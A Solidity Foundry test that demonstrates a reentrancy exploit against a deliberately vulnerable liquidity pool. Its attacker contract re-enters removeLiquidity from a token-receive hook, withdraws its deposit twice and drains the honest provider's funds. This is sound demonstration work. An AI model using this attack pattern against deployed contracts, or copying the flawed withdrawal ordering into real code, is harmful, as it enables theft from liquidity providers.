// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {Token} from "../src/Token.sol";
import {HookToken, ITokenReceiver} from "../src/vulnerable/HookToken.sol";
import {PoolReentrant} from "../src/vulnerable/PoolReentrant.sol";

contract ReentrancyAttacker is ITokenReceiver {
    PoolReentrant public immutable pool;
    uint256 public sharesToWithdraw;
    uint256 public reentries;

    constructor(PoolReentrant _pool) {
        pool = _pool;
    }

    function attack(uint256 shares) external {
        sharesToWithdraw = shares;
        pool.removeLiquidity(shares);
    }

    function onTokenReceived(address, uint256) external override {
        // Re-enter exactly once.
        if (reentries < 1) {
            reentries++;
            pool.removeLiquidity(sharesToWithdraw);
        }
    }
}

contract ReentrancyAttackTest is Test {
    HookToken token0;
    Token token1;
    PoolReentrant pool;
    ReentrancyAttacker attacker;

    address lp = makeAddr("lp");

    function setUp() public {
        token0 = new HookToken("Token 0", "T0");
        token1 = new Token("Token 1", "T1");
        pool = new PoolReentrant(token0, token1);
        attacker = new ReentrancyAttacker(pool);

        // The liquidity provider seeds the pool.
        token0.mint(lp, 1_000);
        token1.mint(lp, 1_000);

        vm.startPrank(lp);
        token0.approve(address(pool), type(uint256).max);
        token1.approve(address(pool), type(uint256).max);
        pool.addLiquidity(1_000, 1_000, 0);
        vm.stopPrank();

        // The attacker receives tokens and deposits them into the pool.
        token0.mint(address(attacker), 1_000);
        token1.mint(address(attacker), 1_000);

        vm.startPrank(address(attacker));
        token0.approve(address(pool), type(uint256).max);
        token1.approve(address(pool), type(uint256).max);
        pool.addLiquidity(1_000, 1_000, 0);
        vm.stopPrank();
    }

    function test_ReentrantWithdrawalDrainsPool() public {
        assertEq(pool.shares(address(attacker)), 1_000);
        assertEq(pool.shares(lp), 900);
        assertEq(pool.totalShares(), 2_000);
        assertEq(pool.reserve0(), 2_000);
        assertEq(pool.reserve1(), 2_000);

        // One withdrawal triggers the hook, which withdraws a second time.
        attacker.attack(1_000);

        assertEq(attacker.reentries(), 1);

        // The attacker deposited 1,000 of each, but receives 2,000 of each.
        assertEq(token0.balanceOf(address(attacker)), 2_000);
        assertEq(token1.balanceOf(address(attacker)), 2_000);

        // The vulnerable double withdrawal drains the pool.
        assertEq(pool.shares(address(attacker)), 0);
        assertEq(pool.shares(lp), 900);
        assertEq(pool.totalShares(), 0);

        assertEq(pool.reserve0(), 0);
        assertEq(pool.reserve1(), 0);
        assertEq(token0.balanceOf(address(pool)), 0);
        assertEq(token1.balanceOf(address(pool)), 0);

        // The honest liquidity provider can no longer withdraw successfully.
        vm.expectRevert();
        vm.prank(lp);
        pool.removeLiquidity(900);
    }
}
